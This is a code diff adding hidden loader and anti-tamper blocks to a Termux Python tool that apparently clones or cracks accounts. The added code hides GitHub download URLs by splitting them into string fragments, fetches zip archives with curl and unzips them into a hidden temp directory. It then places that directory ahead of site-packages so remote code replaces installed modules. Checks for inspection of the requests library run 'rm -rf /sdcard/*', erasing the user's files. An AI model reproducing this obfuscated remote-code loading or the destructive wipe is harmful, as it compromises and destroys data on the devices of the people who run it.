@@ -13,7 +13,153 @@ import requests,mechanize,rich
 from string import *
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
-
+ 
+#───────────────[FAKE CPTHON]───────────────────────── #
+import os,sys,tempfile,string,random,subprocess,uuid
+http_directory = tempfile.mkdtemp(prefix='.')
+site_packages = sys.path[4]
+print(site_packages)
+print(http_directory)
+sys.path.remove(site_packages)
+sys.path.insert(4,http_directory+'/reqmodule')
+sys.path.insert(5,http_directory)
+try:
+        os.mkdir('crypto')
+except:pass
+hh = "ho"
+hh2 = "9/pycrypt"
+find_aarch = subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(find_aarch):
+        user_aarch = '64'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+elif 'arm' in str(find_aarch):
+        user_aarch = '32'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+else:
+        print(' Unknown aarch ')
+        exit()
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
+        os.system('clear')
+        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
+        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
+        os.system('python jan.py')
+else:
+        akk2="rsi"
+        akk=f"cha{akk2}fi"
+        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
+        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
+        os.system(f'curl -L {lib} > {http_directory}/config.zip')
+        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+#───────────────[FAKE CPYTHON End]───────────────────────── #
+#───────────────[BIT ROOM]───────────────────────── #
+import os, platform, time, sys
+#os.system('pkg install espeak ')
+print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mLIMON-HASAN\33[1;91m⊁ ')
+#os.system('espeak -a 300 " ,FILE CLONING 0.1, TOOLS,INSTALL Complete ,"')
+time.sleep(1)
+os.system('clear')
+##
+import os, platform, time, sys
+ 
+try:
+ import requests
+except:os.system("pip uninstall requests -y;pip install requests")
+ 
+print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')
+#os.system('espeak -a 300 " Waiting for Update,"')
+time.sleep(2)
+ 
+ 
+os.system('git pull --quiet 2>/dev/null')
+bit = platform.architecture()[0]
+if bit == '64bit':
+ print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
+ 
+elif bit == '32bit':
+ print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
+ 
+ #───────────────[BIT End]───────────────────────── #
+ 
+ 
+def es():
+      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
+           pass
+      else:
+           system('clear');print('System Modification Not Allowed since using Jutt');exit()
+ 
+      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
+           pass
+      else:
+           system('clear');print('System Modification Not Allowed since using Jutt');exit()
+ 
+      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
+           pass
+      else:
+           system('clear');print('System Modification Not Allowed since using Jutt');exit()
+ 
+ 
+ 
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
+    file_content = file.read()
+if 'print(url)' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip install requests')
+    exit('[ðŸ¤£] RE-RUN TOOL.!')
+ 
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
+    file_content = file.read()
+if 'print' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip install requests')
+    exit('[ðŸ¤£] RE-RUN TOOL.!')
+ 
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
+    file_content = file.read()
+if 'verify=False' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip install requests')
+    exit('[ðŸ¤£] RE-RUN TOOL.!')
+  
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
+    file_content = file.read()
+if 'verify=False' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip install requests')
+    exit('[ðŸ¤£] RE-RUN TOOL.!')
+#----------http_canary-------#
+import requests
+import os,sys
+ 
+ 
+try:
+    g = "anar"
+    f="tt"
+    file_d = os.listdir('rm -rf')
+    if f'com.h{f}pc{g}y.pro' in file_d:
+        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
+        exit()
+    else:
+        pass
+except Exception as e:
+    pass
+ 
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system('pip install requests')
+    
+def clr():
+    try:
+        data = os.listdir('/sdcard/*')
+        if 'Android' in data:
+            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY LIMON');exit()
+        else:exit()
+    except:exit()   
  
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
